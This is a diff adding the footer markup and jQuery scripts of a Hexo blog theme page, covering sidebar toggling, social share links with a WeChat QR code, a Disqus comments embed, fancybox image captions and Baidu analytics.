+		<a href="http://www.zhihu.com/people/chen-ya-qi-93" target="_blank" class="icon-zhihu" title="知乎"></a>
+		
+		
+		
+		<a href="mailto:chendotjs@gmail.com" target="_blank" class="icon-email" title="Email Me"></a>
+		
+	</div>
+			
+		
+
+		<p class="copyright">
+		Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a>2017
+		
+		<a href="/about" target="_blank" title="chendotjs">@chendotjs</a>
+		
+
+		</p>
+</div>
+</footer>
+    <script src="/js/jquery-2.0.3.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/jquery.qrcode-0.12.0.min.js"></script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+  
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else{
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+      
+      $('#toc.toc-aside').css('display', 'none');
+        
+    }
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  c.click(function(){
+    ta.css('display', 'block').addClass('fadeIn');
+  });
+  o.click(function(){
+    ta.css('display', 'none');
+  });
+  $(window).scroll(function(){
+    ta.css("top",Math.max(140,320-$(this).scrollTop()));
+  });
+});
+</script>
+
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var $this = $('.share'),
+      url = $this.attr('data-url'),
+      encodedUrl = encodeURIComponent(url),
+      title = $this.attr('data-title'),
+      tsina = $this.attr('data-tsina'),
+      description = $this.attr('description');
+  var html = [
+  '<div class="hoverqrcode clearfix"></div>',
+  '<a class="overlay" id="qrcode"></a>',
+  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+  '<a href="#qrcode" class="article-share-qrcode" title="微信"></a>',
+  '<a href="http://widget.renren.com/dialog/share?resourceUrl=' + encodedUrl + '&srcUrl=' + encodedUrl + '&title=' + title +'" class="article-share-renren" target="_blank" title="人人"></a>',
+  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="微博"></a>',
+  '<span title="Share to"></span>'
+  ].join('');
+  $this.append(html);
+
+  $('.hoverqrcode').hide();
+
+  var myWidth = 0;
+  function updatehoverqrcode(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+    var qrsize = myWidth > 1024 ? 200:100;
+    var options = {render: 'image', size: qrsize, fill: '#2ca6cb', text: url, radius: 0.5, quiet: 1};
+    var p = $('.article-share-qrcode').position();
+    $('.hoverqrcode').empty().css('width', qrsize).css('height', qrsize)
+                          .css('left', p.left-qrsize/2+20).css('top', p.top-qrsize-10)
+                          .qrcode(options);
+  };
+  $(window).resize(function(){
+    $('.hoverqrcode').hide();
+  });
+  $('.article-share-qrcode').click(function(){
+    updatehoverqrcode();
+    $('.hoverqrcode').toggle();
+  });
+  $('.article-share-qrcode').hover(function(){}, function(){
+      $('.hoverqrcode').hide();
+  });
+});   
+</script>
+
+
+
+
+<script type="text/javascript">
+
+var disqus_shortname = 'chendotjsme';
+
+(function(){
+  var dsq = document.createElement('script');
+  dsq.type = 'text/javascript';
+  dsq.async = true;
+  dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+  (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+}());
+(function(){
+  var dsq = document.createElement('script');
+  dsq.type = 'text/javascript';
+  dsq.async = true;
+  dsq.src = '//' + disqus_shortname + '.disqus.com/count.js';
+  (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+}());
+</script>
+
+
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.article-content').each(function(i){
+    $(this).find('img').each(function(){
+      if ($(this).parent().hasClass('fancybox')) return;
+      var alt = this.alt;
+      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
+      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
+    });
+    $(this).find('.fancybox').each(function(){
+      $(this).attr('rel', 'article' + i);
+    });
+  });
+  if($.fancybox){
+    $('.fancybox').fancybox();
+  }
+}); 
+</script>
+
+
+
+<!-- Analytics Begin -->
+
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "//hm.baidu.com/hm.js?beac4dd688349f82bebe8f32bb4c52db";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+
+<!-- Analytics End -->
+
+<!-- Totop Begin -->
+
+	<div id="totop">
+	<a title="Back to Top"><img src="/img/scrollup.png"/></a>
+	</div>
+	<script src="/js/totop.js"></script>
+
+<!-- Totop End -->
+
+<!-- MathJax Begin -->
+<!-- mathjax config similar to math.stackexchange -->
+
+
+<!-- MathJax End -->
+
+<!-- Tiny_search Begin -->
+
+<!-- Tiny_search End -->
+
+  </body>
+</html>
